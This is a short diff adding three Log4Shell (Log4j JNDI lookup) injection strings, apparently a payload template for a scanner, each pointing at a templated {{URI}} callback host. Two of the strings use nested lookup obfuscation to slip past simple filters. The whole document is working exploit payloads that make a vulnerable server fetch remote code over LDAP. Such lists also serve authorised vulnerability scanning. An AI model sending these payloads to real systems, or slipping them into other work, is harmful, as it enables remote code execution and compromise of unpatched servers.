@@ -1,0 +1,3 @@
+${jndi:ldap://{{URI}}}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{URI}}}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{URI}}}
